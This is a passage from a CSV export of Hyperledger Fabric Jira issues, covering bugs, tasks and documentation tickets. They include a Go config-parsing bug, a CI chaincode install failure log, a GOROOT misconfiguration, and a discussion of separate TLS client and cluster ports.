{{ /opt/gopath/src/github.com/hyperledger/fabric/orderer/main.go:15 +0x20}}",,manish-sethi,Tecnalia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014v7:",,,,Unset,Unset,,Download the byfn and run it,,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,Tecnalia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Nov/19 12:30 AM;wlahti;Can you provide more details of which byfn steps you ran and the parameters you used? And can you provide the full logs? ;;;","25/Nov/19 7:56 PM;Tecnalia;[~wlahti] byfn parameters were:
 * orderer type: raft
 * storage mode: couchdb
 * tls: default option in byfn
 * other remaining configurations same as in bfyn files from github.

Im sorry but I dont have those logs anymore;;;","18/Jan/20 12:21 AM;manish-sethi;[~Tecnalia] - Can you list (and verify) concrete steps to reproduce this.

If this is not reproducible, we can close this for now and you can reopen if there is  more info.

/cc [~guoger] - If you can think of something by looking at the stack trace.;;;","21/Apr/20 4:13 PM;Tecnalia;[~manish-sethi] we cannot give you details about how to reproduce, it happens on a rapidly changing dev environment so we can close it for now. But keep in mind there is a bug in {{utils.GetMetadataFromBlock}} call;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Packaging Go chaincode errors if trying to package outside GOPATH,FAB-17102,43366,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,awjh-ibm,awjh-ibm,18/Nov/19 10:49 PM,19/Nov/19 1:42 AM,28/Oct/23 3:09 AM,19/Nov/19 1:42 AM,,,,,,,,,,,,,,fabric-sdk-node,,,,,,,,,0,,,,,,The packager for Go chaincode assumes that I am using the old style of Go where I write all my code within my GOPATH (not that it should anyway since it doesn't try to build on the local machine just takes the files). Newer Go projects are written using Go Modules meaning it is no longer necessary for the Go to be written within a Go path to be valid. It should therefore be able to handle this new style and allow me to package my Go project outside my GOPATH.,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014vn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add upgrade network option to operator,FAB-17103,43368,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,19/Nov/19 1:27 AM,25/Jan/20 3:27 AM,28/Oct/23 3:09 AM,25/Jan/20 3:27 AM,v2.0.0,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Add upgrade network option to operator,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Nov/19 5:23 AM;suryalnvs;https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34453/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Commerical Paper to swap Face Value/Par Value,FAB-17104,43369,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,robmurgai,robmurgai,robmurgai,19/Nov/19 2:10 AM,19/Apr/20 1:25 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-docs,fabric-samples,,,,,,,,0,,,,,,"It looks like we are using a Face Value of $5 Mil in the example but the example seems to support needing $5 Mil in Par Value.

FYI  [~pandrejko]",,robmurgai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65j",,,,No,Unset,,(Please add steps to reproduce),,No,,,,,,Unset,,Unset,,(Please add usage information),robmurgai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Link Broken in Section ""Multiple States""",FAB-17105,43370,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,pandrejko,robmurgai,robmurgai,19/Nov/19 2:39 AM,23/Nov/19 11:40 PM,28/Oct/23 3:09 AM,23/Nov/19 11:38 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"[https://hyperledger-fabric.readthedocs.io/en/latest/developapps/architecture.html#multiple-states]

 

Hyperlegder Fabric internally uses a concurrency control [mechanism|https://hyperledger-fabric.readthedocs.io/en/latest/arch-deep-dive.html#the-endorsing-peer-simulates-a-transaction-and-produces-an-endorsement-signature] to update a ledger, such that keeping papers in separate state vectors vastly reduces the opportunity for shared-state collisions. 

 

<<Mechanism Link Broken>>

FYI [~pandrejko]",,pandrejko,robmurgai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65ji",,,,No,Unset,,(Please add steps to reproduce),,No,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,robmurgai,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Nov/19 3:08 AM;pandrejko;[~robmurgai] When we removed the arch topic a few weeks ago, there are 3 links that are broken now:

 

{color:#1d1c1d}I did a search on arch-deep-dive across the docs and found it is referenced in 3 places:{color}
{color:#1d1c1d}1. Developing apps: {color}[https://hyperledger-fabric.readthedocs.io/en/latest/developapps/architecture.html#physical-representation]
{color:#1d1c1d}2. Developing apps: {color}[https://hyperledger-fabric.readthedocs.io/en/latest/developapps/connectionoptions.html#considerations]
{color:#1d1c1d}3. Fabcar: {color}[https://hyperledger-fabric.readthedocs.io/en/latest/understand_fabcar_network.html#for-more-information]

 ;;;","23/Nov/19 5:36 AM;robmurgai;PR: [https://github.com/hyperledger/fabric/pull/306];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric-merge-end-2-end job: Chaincode installation fail on javascript-chaincode test in byfn testing inconsistently.,FAB-17107,43372,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,vijaypunugubati,vijaypunugubati,19/Nov/19 4:28 AM,03/Dec/19 12:06 PM,28/Oct/23 3:09 AM,03/Dec/19 12:06 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-ci,,,,,,,,,0,ci-failure,,,,,"fabric-merge-end-2-end job: Chaincode installation fail on javascript-chaincode test in byfn testing. 

*Branch:* Master

*Platform:* x86_64

*Error Snippet:*
{code:java}
/00:30:37.558 Installing chaincode on peer1.org2...
00:30:37.559 + peer lifecycle chaincode install mycc.tar.gz
00:30:43.448 + res=1
00:30:43.448 + set +x
00:30:43.449 Error: chaincode install failed with status: 500 - failed to invoke backing implementation of 'InstallChaincode': could not build chaincode: docker build failed: docker image build failed: docker build failed: Error returned from build: 1 ""+ INPUT_DIR=/chaincode/input
00:30:43.449 + OUTPUT_DIR=/chaincode/output
00:30:43.449 + cp -R /chaincode/input/src/. /chaincode/output
00:30:43.449 + cd /chaincode/output
00:30:43.449 + '[' -f package-lock.json -o -f npm-shrinkwrap.json ]
00:30:43.449 + npm install --production
00:30:43.449 + INPUT_DIR=/chaincode/input
00:30:43.449 + OUTPUT_DIR=/chaincode/output
00:30:43.449 + cp -R /chaincode/input/src/. /chaincode/output
00:30:43.449 + cd /chaincode/output
00:30:43.449 + '[' -f package-lock.json -o -f npm-shrinkwrap.json ]
00:30:43.449 + npm install --production
00:30:43.449 npm ERR! Unexpected end of JSON input while parsing near '...version"":""2.0.0-snaps'
00:30:43.449 
00:30:43.449 npm ERR! A complete log of this run can be found in:
00:30:43.449 npm ERR!     /root/.npm/_logs/2019-11-18T19_13_00_844Z-debug.log
00:30:43.449 ""
00:30:43.450 !!!!!!!!!!!!!!! Chaincode installation on peer1.org2 has failed !!!!!!!!!!!!!!!!
00:30:43.450 ========= ERROR !!! FAILED to execute End-2-End Scenario ===========/ code placeholder
{code}
 

*Build Logs:* 

[https://logs.hyperledger.org/production/vex-yul-hyp-jenkins-3/fabric-merge-end-2-end-x86_64/6741/Docker_Container_Logs/]

[https://jenkins.hyperledger.org/view/Merge/job/fabric-merge-end-2-end-x86_64/6741/]",,btl5037,denyeart,vijaypunugubati,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014wj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,vijaypunugubati,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Dec/19 12:06 PM;btl5037;We no longer run e2e in fabric and this doesnt appear to be happening in places still running byfn. Marking invalid;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric on DOcker up and Running - Video,FAB-17108,43373,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,abdulrashid,abdulrashid,19/Nov/19 1:53 PM,17/Nov/20 6:42 AM,28/Oct/23 3:09 AM,17/Nov/20 6:42 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"Hi,

Here is the video showing hyperledger fabric is up and running on my digitalocean 5 USD Droplet.

[https://youtu.be/n_fDEZurNGk]

 

One problem is after a year, it ate 25 GB Diskspace but still up and running",,abdulrashid,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014wr:",,,,Unset,Unset,,Just watch https://youtu.be/n_fDEZurNGk,,Unset,,,,,,Unset,,Unset,,(Please add usage information),abdulrashid,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Apr/20 12:46 AM;denyeart;[~abdulrashid] What is the issue? If blocks are being created throughout the year you can expect storage to increase.;;;","17/Nov/20 6:41 AM;manish-sethi;[~abdulrashid] - closing this one. If you have any specific problem or more information, you can open this again.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"viper config parameter ""peer.deliveryclient.reConnectBackoffThreshold"" is retrieved incorrectly",FAB-17109,43376,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,tsharris,tock,tock,19/Nov/19 5:21 PM,01/Apr/20 3:20 AM,28/Oct/23 3:09 AM,01/Apr/20 3:20 AM,v1.4.3,v2.0.0,,,,,,,,v1.4.7,v2.x,,,fabric-peer,,,,,,,,,0,ipm,,,,,"This parameter is specified as duration in the core.yaml file, i.e. ""3600s"", but is retrieved as if it is a float. (see deliveryclient.go L42)
{code:java}
func getReConnectBackoffThreshold() float64 {
	return util.GetFloat64OrDefault(""peer.deliveryclient.reConnectBackoffThreshold"", defaultReConnectBackoffThreshold)
}
{code}
As a result, the default is always in effect in the deliveryservice.broadcastClient , no matter what is in the core.yaml file.

The solution is simple: change getReConnectBackoffThreshold() to first get the value as a time.Duration, and then convert it to a float.",,sykesm,tock,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzri",,,,Unset,Unset,,"change the value in core.yaml, start the peer, check if the value is in effect.",,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tock,tsharris,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Mar/20 1:14 AM;sykesm;In v2, the bug still exists but now lives in {{core/deliverservice/config.go}} where {{DeliverServiceConfig#ReConnectBackoffThreshold}} is defined as a float and loaded from viper as a float.;;;","31/Mar/20 9:18 PM;tsharris;[https://github.com/hyperledger/fabric/pull/951];;;","01/Apr/20 2:08 AM;tsharris;[https://github.com/hyperledger/fabric/pull/960];;;","01/Apr/20 2:10 AM;tsharris;[https://github.com/hyperledger/fabric/pull/959];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Separate client and cluster facing ports on peers and orderers,FAB-17111,43378,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,hakan.eryargi,hakan.eryargi,19/Nov/19 9:02 PM,20/Nov/19 7:38 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-orderer,fabric-peer,,,,,,,,0,,,,,,"TLS makes load balancing for peer and orderer nodes difficult to implement. Without TLS, many transparent load balancing mechanisms just work out of the box, for example Kubernetes services.

It would be beneficial to separate client and cluster facing ports on peers and orderers, so TLS  can be enabled on those ports separately.

Generally client applications and relevant Fabric peers and orderers run in the same trusted environment where TLS is not a security requirement. In contrast. disabling TLS have benefits for scalability and availability.

This is related to FAB-15648

In addition to discussion in that ticket, re-thinking suggests, TLS termination proxies wont help in mixed environments, where some peers/orderers are behind a TLS termination proxy some other not. So, as it's now, in a mixed environment TLS should be enabled network wide which will prevent transparent load balancing.

 ",,hakan.eryargi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i014xv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),hakan.eryargi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Nov/19 9:05 PM;hakan.eryargi;[~yacovm]    

[~jyellick] 

[~mastersingh24]

What do you think? This looks like a natural extension to FAB-15648;;;","19/Nov/19 9:19 PM;yacovm;{quote}TLS makes load balancing for peer and orderer nodes difficult to implement.
{quote}
The whole point is that Fabric does this load balancing for you in every layer - starting from the SDK and concluding in the peers / orderers.

 
{quote}Without TLS, many transparent load balancing mechanisms just work out of the box, for example Kubernetes services.
{quote}
I don't think that it makes sense to run Fabric in production without TLS.

Fabric is a Blockchain and as such it is supposed to be used across different organizations that don't trust each other and they always move around sensitive and confidential data.
 It's true that you can run the nodes in some service mesh that does the TLS termination for you like Istio, but why would you do that if Fabric manages TLS for you, for all the organizations in the network?

 
{quote}In addition to discussion in that ticket, re-thinking suggests, TLS termination proxies wont help in mixed environments, where some peers/orderers are behind a TLS termination proxy some other not.
{quote}
Take a look at FAB-8131, it is possible to make changes to Fabric such that it will also support TLS terminating proxies. In addition you can also use a non TLS terminating proxy and then you won't have problems. 

 

 ;;;","19/Nov/19 11:37 PM;hakan.eryargi;{quote}The whole point is that Fabric does this load balancing for you in every layer - starting from the SDK and concluding in the peers / orderers.
{quote}
I guess you mean connection profiles and discovery. I would still prefer native Kubernetes load balancing, for it is:

#  Much convenient (less configuration)
#  More effective (Kubernetes knows better which peer/orderer is down and react and route the traffic accordingly)

You can check [this diagram|https://camo.githubusercontent.com/7c65286ca5ccadcfe27c3414995405c1d3541e8b/68747470733a2f2f726166742d6661627269632d6b7562652e73332d65752d776573742d312e616d617a6f6e6177732e636f6d2f696d616765732f484c5f696e5f4b7562655f726166742e706e67] for how it's conveniently implemented.
{quote}I don't think that it makes sense to run Fabric in production without TLS.

Fabric is a Blockchain and as such it is supposed to be used across different organizations that don't trust each other and they always move around sensitive and confidential data.
{quote}
For mixed environments, definitely agree. That's the whole point of this Jira ticket. I want to enable TLS for inter peer-orderer communication.

But for client to peer/orderer communication, I don't see any value of enabling TLS if they are in the same trusted Kubernetes cluster.
{quote}why would you do that if Fabric manages TLS for you, for all the organizations in the network?
{quote}
Not sure what you meant here?
{quote}Take a look at FAB-8131, it is possible to make changes to Fabric such that it will also support TLS terminating proxies. In addition you can also use a non TLS terminating proxy and then you won't have problems.
{quote}
That's nice! But does every proxy support that header? What about some peers/orderers cannot be behind a proxy for whatever reason?

 ;;;","19/Nov/19 11:57 PM;yacovm;It's nice that you deploy your entire network into a single Kubernetes cluster, however most Blockchain use cases are to connect different administrative domains that have no trust between them, and some people want to run on premise and not use K8S, and who knows if some company won't invent a better and easier orchestration engine in 2 years? 
Fabric can't assume everyone uses Kubernetes in the same cluster, etc. etc. 

 
{quote}But for client to peer/orderer communication, I don't see any value of enabling TLS if they are in the same trusted Kubernetes cluster.
{quote}
Why are you using a Blockchain then? You are running in a trusted environment. Why are you not using a distributed database?
{quote} 

Not sure what you meant here?
{quote}
 

Well, in Fabric if you connect to channel *foo* then the peer makes sure that the TLS CAs of the channel that are the roots of the verification chain of the TLS handshake are indeed what you put in channel *foo* and that you're not talking to a node from another organization that is in channel *bar* but that it has issued a TLS certificate that corresponds to the same IP/DNS name.

Obviously, in a single Kubernetes cluster managed by your company, you don't have to worry about such problems, but Fabric worries about it so you don't have to.

 
{quote}That's nice! But does every proxy support that header? What about some peers/orderers cannot be behind a proxy for whatever reason?
{quote}
If they can't be behind a proxy then there is no problem isn't it? :);;;","20/Nov/19 6:52 AM;hakan.eryargi;[~yacovm] I guess you are misinterpreting our use case and also the need for this ticket. This is a general need, not tied to K8S usage or our specific use case. Let me rephrase.

As you mentioned, Fabric is a Blockchain and it's expected that it will run on a mixed environment from different administrative domains. Some peers/orderers can run on K8S, some on premises, some on wherever. As no one can guarantee each of these peers/orderers will be behind some TLS termination proxy (and possibly also for other details) I agree it's definitely good enabling TLS for communication between these mixed peers and orderers.

Imagine I'm at *peer organization A* and running 2 peer nodes and maybe some orderer nodes. These can be on K8S, on premises or wherever. They will communicate with other peers/orderers and also among themselves via TLS. This is what I meant by *cluster facing ports*.

At the *same wherever*, I also run my application. As my own peers/orderers and application are in the very *same trusted wherever*, there is no need to enable TLS between *my application* and *my peer/orderer*. We are strictly talking about *client to peer* or *client to orderer* communication here. This is what I meant by *client facing ports*. Any node owner can configure his own node to use TLS at client facing port or not.

All communication among peers and orderers (*cluster facing ports*) will still use TLS (if that's the global setting)

Hope it's clear now.
 

 ;;;","20/Nov/19 6:58 AM;yacovm;What is the reason for which you want to disable TLS between clients in your organization and nodes (peers/orderers) in your own organization? You said you want to do load balancing via K8S, but I argue that the SDK should know how to do it better.

For example, if you have several peers - x,y,z and their ledger heights are 100, 100, 30.
You don't want to use peer z because its data is old and not up to date.

Kubernetes has no way of knowing this, however the SDK can know this and skip connecting to the last peer. The Go SDK has these kind of logic in it from what I heard.;;;","20/Nov/19 7:13 AM;hakan.eryargi;Right, the main reason is for load balancing, also for the simplicity of configuration, and also TLS costs some performance. possibly not that much tough.

{quote}
For example, if you have several peers - x,y,z and their ledger heights are 100, 100, 30.
You don't want to use peer z because its data is old and not up to date.
{quote}
That's an interesting case and good to know, thanks :) But possibly very rare occurrence, I guess? Especially considering these peers are very close to each other.

It's correct Kubernetes cannot know this but it will know better than anything which peer/orderer is down. Theoretically I can add new peers, or remove some peers without changing a bit of configuration on the client side.

;;;","20/Nov/19 7:20 AM;yacovm;long lasting TLS connections shouldn't have any performance overhead that you can measure. 

 
{quote}But possibly very rare occurrence, I guess?

Theoretically I can add new peers, or remove some peers without changing a bit of configuration on the client side.
{quote}
When you add new peers they need to pull the entire blockchain and validate it. It can take days....;;;","20/Nov/19 7:38 AM;hakan.eryargi;{quote}When you add new peers they need to pull the entire blockchain and validate it. It can take days....
{quote}
For a peer in the very same K8S cluster, it's hard to imagine it can take days.

But actually you reminded me a very good point, a *readiness probe* endpoint for the peer for these kind of situations if not already implemented. Which will naturally and smoothly integrate with K8S load balancing :);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
GOROOT directory not found in weekly PTE job,FAB-17113,43383,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,20/Nov/19 1:40 AM,20/Nov/19 11:45 PM,28/Oct/23 3:09 AM,20/Nov/19 11:45 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"GOROOT directory is not found or incorrect path is set in the Jenkins configuration

```
06:43:48 *go: cannot find GOROOT directory: /opt/go/go1.13.4.linux.amd64* 
```

I see some misconfiguration in weekly PTE job related to GOROOT and go settings.",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrp:i94",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Nov/19 11:45 PM;rameshthoomu;https://gerrit.hyperledger.org/r/#/c/ci-management/+/34426/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create AZP YAML Files,FAB-17114,43399,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,21/Nov/19 12:53 AM,18/Jan/20 12:53 PM,28/Oct/23 3:09 AM,18/Jan/20 12:53 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01503:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Doc for GitHub Migration,FAB-17115,43401,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,21/Nov/19 1:02 AM,22/Nov/19 1:23 PM,28/Oct/23 3:09 AM,22/Nov/19 7:12 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0150j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Use bootstrap method for raft consensus,FAB-17116,43402,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,21/Nov/19 3:08 AM,17/Jan/20 3:54 AM,28/Oct/23 3:09 AM,17/Jan/20 3:54 AM,v1.4.4,,,,,,,,,v2.0.0,,,,fabric-orderer,,,,,,,,,0,,,,,,"Currently HLF uses ORDERER_GENERAL_GENESISMETHOD to specify the method for bootstrap.

However, with latest changes including raft and the bootstrapfile, the method is expanded to support both genesisfile and configfile.

